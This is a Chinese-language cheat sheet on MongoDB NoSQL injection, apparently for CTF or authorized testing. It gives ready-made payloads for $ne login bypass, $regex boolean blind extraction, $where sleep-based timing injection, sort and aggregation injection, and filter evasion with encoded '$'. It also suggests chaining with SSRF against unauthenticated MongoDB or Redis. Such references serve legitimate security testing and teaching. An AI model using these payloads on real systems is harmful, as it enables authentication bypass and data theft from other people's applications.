NoSQL 注入的根因和 SQLi 一样：**用户输入被当成查询结构的一部分**。区别在于 MongoDB 查询是文档，一个 `$ne` 就能把“等值匹配”变成“不等匹配”。

> 只对本地题目或授权环境测试；`$where` 会执行服务端 JavaScript，可能影响性能，先小范围验证。

## 00 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 确认 MongoDB | `MongoError`/`E11000`/JSON 登录 | 看技术栈 |
| 登录绕过 | `username[$ne]=1&password[$ne]=1` | 表单数组 |
| JSON 体 | `{"username":{"$ne":null}}` | `application/json` |
| 已知用户 | `username=admin&password[$ne]=1` | 少猜一个字段 |
| 猜用户名 | `username[$regex]=^adm` | 逐字符 |
| 布尔盲注 | `$regex` 前缀 | 看欢迎/错误差异 |
| 时间盲注 | `$where` + `sleep` | 可能被禁用 |
| 字段/排序 | `sort`/`$orderby` | 结构注入 |
| 类型证据 | 传数组看是否报 `Array to string` | 报错即入口 |

## 01 原理与成立条件

```text
HTTP 参数 → 框架解析（字符串/数组/对象）
              ↓
        驱动拼成查询文档 {"field": <用户值>}
              ↓
        值里含 $ 操作符 = 改变查询语义
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 输入进入查询 | 直接作为字段值 | 找拼接/排序/聚合 |
| 类型未被强转 | 数组/对象能保留 | 试字符串操作符 |
| 操作符未被过滤 | `$` 键可达 | 换编码/换字段 |
| 结果可观察 | 登录成功/报错/延时 | 用盲注 |

| 栈 | 典型解析 | 入口 |
|---|---|---|
| PHP | `$_POST['u']` 可为数组 | `u[$ne]=1` |
| Node `express.json` | 原样 JSON | `{"u":{"$ne":1}}` |
| Node `urlencoded extended` | qs 解析 | `u[$ne]=1` |
| Python/Flask | dict/list | JSON 体 |

## 02 判断与分型

```text
登录/查询接口报错或行为异常？
 ├─ 传数组/对象看类型错误 → 可能进入查询
 ├─ 表单数组有效 → PHP/qs 入口
 ├─ JSON 有效 → Node/Express
 └─ 都不行 → 试排序/聚合/字符串操作符
结果差异是什么？
 ├─ 成功/失败 → 布尔盲注
 ├─ 报错内容 → 错误注入
 ├─ 响应时间 → 时间盲注
 └─ 数据回显 → 直接注入
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| `Array to string conversion` | 数组进入查询 | 用 `$ne` 数组 |
| `MongoError`/`E11000` | 驱动回显 | 读字段/查结构 |
| 双字段 `$ne` 登录成功 | 经典绕过 | 记录 |
| 正则前缀改变结果 | 布尔盲注 | 写脚本 |
| `$where` 报错 | 可能可用 | 试布尔/时间 |
| 排序参数改变顺序 | 结构注入 | 试 `$orderby` |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| `$ne` 变成字面量 | 后端强转字符串 | 换 JSON/换字段 |
| 登录成功但无权限 | 匹配到普通用户 | 指定用户名 |
| 正则报错 | 特殊字符未转义 | 转义后重试 |
| 延时不稳 | 网络/集合大 | 多次取中位数 |

## 03 利用阶梯

### L0 判断是否进入查询

**前提**：有登录/查询接口，参数疑似直接进 MongoDB。

**步骤**：
1. 提交数组：`username[$ne]=1&password[$ne]=1`。
2. 提交 JSON：`{"username":{"$ne":null}}`。
3. 传 `username[]=a`、`username[x]=1` 看报错。
4. 看响应头/错误页是否出现 Mongo 字样。

**成功标志**：数组/对象改变查询行为或触发类型错误。

**失败分支**：被强转→试字符串形式；非 MongoDB→转 SQL/其他。

### L1 登录绕过

**前提**：查询直接把字段值与用户输入比较。

**步骤**：
1. 双字段不等：`username[$ne]=1&password[$ne]=1`。
2. 已知用户：`username=admin&password[$ne]=1`。
3. JSON：`{"username":"admin","password":{"$ne":"x"}}`。
4. 正则：`username[$regex]=^adm&password[$ne]=1`。

**成功标志**：无需正确密码进入账号。

**失败分支**：强转字符串→换 JSON；匹配到错误用户→加用户名条件。

### L2 布尔盲注取数据

**前提**：登录/查询有稳定的成功/失败差异。

**步骤**：
1. 用 `$regex: "^前缀"` 逐字符测试。
2. 区分“用户不存在”和“密码错误”，避免误判。
3. 转义正则特殊字符，必要时用 `.*` 跳过。
4. 脚本循环直到无字符匹配。

**成功标志**：稳定还原用户名/密码/字段值。

**失败分支**：差异不稳→换字段/换接口；正则被禁→`$where`/`$expr`。

### L3 时间盲注与 `$where`

**前提**：无回显、无稳定布尔差异，但 `$where` 可用。

**步骤**：
1. 试 `{"$where":"1==1"}` 与 `1==2` 的响应差异。
2. 时间型：`this.username.match(/^a/) && sleep(2000)`。
3. 缩小集合范围（已知字段/limit），避免全表执行。
4. 多次测量取中位数。

**成功标志**：可控延时/布尔差异。

**失败分支**：`$where` 禁用→聚合 `$expr`/排序注入；无时间函数→布尔。

### L4 结构注入与横向

**前提**：排序、字段名、聚合管道可控。

**步骤**：
1. 试 `sort=field`、`sort[$ne]=1`、`$orderby`。
2. 聚合：`$match`/`$lookup`/`$expr` 注入。
3. 若可写 `role`/`isAdmin`，测越权改字段。
4. 结合 SSRF 打未授权 MongoDB/Redis。

**成功标志**：改变查询结构/越权/横向。

**失败分支**：白名单严格→回 L2；无写权限→转只读泄露。

## 04 绕过与边界

| 限制 | 替代 | 示例 |
|---|---|---|
| 数组被拒 | JSON 对象 | `{"$ne":1}` |
| `$` 被过滤 | 编码/Unicode | `%24ne`、`\u0024ne` |
| 操作符黑名单 | 逻辑组合 | `$or`/`$and` |
| 强转字符串 | 换参数/换接口 | 排序/聚合 |
| 正则被禁 | `$where`/`$expr` | 布尔表达式 |
| 错误隐藏 | 时间/布尔盲注 | `sleep`/前缀 |
| 登录限速 | 单请求多条件 | `$in`/`$regex` |

边界：`$regex` 灾难性回溯可能拖垮服务；`$where` 对每条文档执行，测试要限流。

## 05 非典型入口

| 位置 | 示例 | 注意 |
|---|---|---|
| 注册查重 | `username[$ne]=1` | 枚举用户 |
| 搜索接口 | `q[$regex]=...` | 盲注 |
| 排序 | `sort[$ne]=1` | 结构注入 |
| 分页 | `limit`/`skip` 拼接 | 注入 |
| 聚合 | `$lookup`/`$expr` | 复杂查询 |
| 密码重置 | 邮箱字段数组 | 绕过校验 |
| API JSON | 嵌套对象 | Node 栈 |
| Header | 租户 ID | 多租户越权 |

## 06 差异速查

| 项 | 行为 | 影响 |
|---|---|---|
| PHP 驱动 | 数组转文档 | `$ne` 可用 |
| `(string)` 强转 | 数组变 `Array` | 注入失败 |
| `express.json` | 保留对象 | JSON 注入 |
| `extended:false` | 不解析嵌套 | 用 JSON |
| `$where` | 服务端 JS | 性能/禁用 |
| `$regex` | 正则匹配 | 可盲注/DoS |
| `$expr` | 聚合表达式 | 布尔注入 |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| `$ne` 无效 | 强转/过滤 | 换 JSON/编码 |
| 登录成功但非目标 | 匹配首条 | 加用户名 |
| 正则无差异 | 错误未区分 | 分用户不存在/密码错 |
| 延时不稳 | 集合大/网络 | 缩小范围/多次测量 |
| `$where` 报错 | 禁用/驱动不支持 | 换 `$expr`/排序 |
| 数组报错 | 类型检查 | 试字符串操作符 |
| 无回显 | 盲注 | 布尔/时间 |
